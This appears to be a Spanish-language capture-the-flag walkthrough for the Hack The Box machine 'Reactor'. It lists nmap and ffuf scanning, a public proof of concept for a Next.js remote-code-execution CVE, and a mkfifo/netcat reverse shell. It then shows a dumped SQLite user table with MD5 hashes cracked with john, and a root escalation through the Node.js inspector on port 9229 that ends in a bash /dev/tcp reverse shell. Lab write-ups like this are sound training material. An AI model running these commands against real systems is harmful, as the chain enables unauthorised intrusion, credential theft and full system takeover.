#Reactor
- HTB
- 10.129.119.171
- nmap -sCV -Pn 10.129.119.171 -> 22ssh , 3000/tcp servidor http next.js con whatweb
- ffuf -u http://10.129.119.171:3000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
- No encuentro nada paso medium list -> ❯ ffuf -u http://10.129.119.171:3000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 200
- nada no descubro nada -> miro version en whatweb 15.0.3 -> tiene cve-2025-55182
- git clone https://github.com/jensnesten/React2Shell-PoC.git
- python3 main.py http://10.129.119.171:3000 'id' -> ejecuta comandos
- nc -lvnp 9005
- python3 main.py http://10.129.119.171:3000 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.206 9005 >/tmp/f'
- python3 -c 'import pty;pty.spawn("/bin/bash")'
- ctrl + z -> stty raw -echo; fg -> export TERM=xterm
- leemos el archivo de base de datos -> cat reactor.db
- sqlite3 /opt/reactor-app/reactor.db ".dump" uso sqlite3 para leer mejor la bd.
- INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ada5c101b17b8','administrator','admin@reactor.htb');
INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a68639812cd271e8e','operator','engineer@reactor.htb'); -> tenemos credenciales :9
❯ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_engineer.txt la de admin no puedo deshashearla.
ssh engineer@10.129.119.171 -> contraseña deshasheada.
pillaamos userflag y sudo -l no puedo
find / -perm -4000 -type f 2>/dev/null nada interesante
ss -tulnp -> tcp  LISTEN  0  511  127.0.0.1:9229  0.0.0.0:*

Port 9229 — the standard Node.js V8 Inspector/debugger port — was listening on localhost only. This port is used by Node.js processes launched with --inspect, allowing remote code evaluation via the Chrome DevTools Protocol.
node inspect 127.0.0.1:9229 
exec("process.mainModule.require('child_process').execSync('id').toString()") -> somos root
nc -nlvp 9005 -> abrimos el puerto
exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.206/9005 0>&1\"').toString()")
recibimos una shell como root.
